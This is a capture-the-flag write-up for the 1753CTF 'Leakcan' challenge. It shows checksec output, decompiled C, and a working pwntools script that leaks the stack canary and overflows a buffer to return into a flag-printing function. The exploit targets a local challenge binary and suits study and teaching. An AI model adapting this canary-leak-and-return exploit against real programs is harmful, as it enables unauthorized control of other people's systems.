- This challenge is a relatively simple canary leak #ret2win but the binary is static for some ugly reason. The decomiplation isn't too pretty either

```sh
❯ checksec leakcan_chall       
[*] '/home/aldamd/ctf/xinsheng/CTFs/2025/1753CTF/Leakcan/leakcan_chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### challenge

```c
int64_t main()
    void* fsbase
    int64_t canary = *(fsbase + 0x28)
    char nameBuf[0x14]
    __builtin_strncpy(dest: &nameBuf, src: "What\'s your name?\n", n: 0x14)
    char countryBuf[0x37]
    __builtin_strncpy(dest: &countryBuf, src: "Can you provide me with country also? I will save it\n", n: 0x37)
    char helloBuf[0x9]
    __builtin_strncpy(dest: &helloBuf, src: "Hello! ", n: 9)
    int64_t rsi
    __libc_write(1, &nameBuf, strlen(&nameBuf, rsi, 0x766173206c6c6977))
    char* input
    __libc_read(0, &input, 0x78)
    __libc_write(1, &helloBuf, strlen(&helloBuf))
    __libc_write(1, &input, strlen(&input))
    __libc_write(1, &countryBuf, strlen(&countryBuf))
    __libc_read(0, &input, 0x78)
    _IO_puts("Data saved, thank you. Good luck…")
    *(fsbase + 0x28)
    
    if (canary == *(fsbase + 0x28))
        return 0
    
    __stack_chk_fail()
    noreturn
```

- There is another function `your_goal` which prints the flag for us, indicating this is a `ret2win` challenge
- The exploit steps will be as follows:
 	- Provide a string in the first `__libc_read` call that overwrites the first byte of the canary (always NULL)
 	- Now as long as we're not unlucky, `strelen(&input)` includes the canary and then some, allowing us to leak the `canary` to stdout
 	- We then provide the second `__libc_read` call with our buffer overflow to `your_goal` along with the `canary`

### solve

```python
#!/usr/bin/env python3

from pwn import *

exe = "./leakcan_chall"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

input2Canary = 0x68 - 0x10

context.log_level = "debug"
# io = gdb.debug(exe, "c")
io = process(exe)

# leak canary value
payload = flat({input2Canary: b"A"})
io.sendafter(b"name?", payload)
io.recvuntil(b"Hello! ")
io.recv(input2Canary + 1)
canary = u64(io.recv(7).rjust(8, b"\x00"))
info("canary: %#x", canary)

payload = flat({input2Canary: canary, input2Canary + 0x10: elf.sym.your_goal})
io.send(payload)
io.recvuntil(b"Good luck")
io.recvline()
success(io.recvlineS())
```
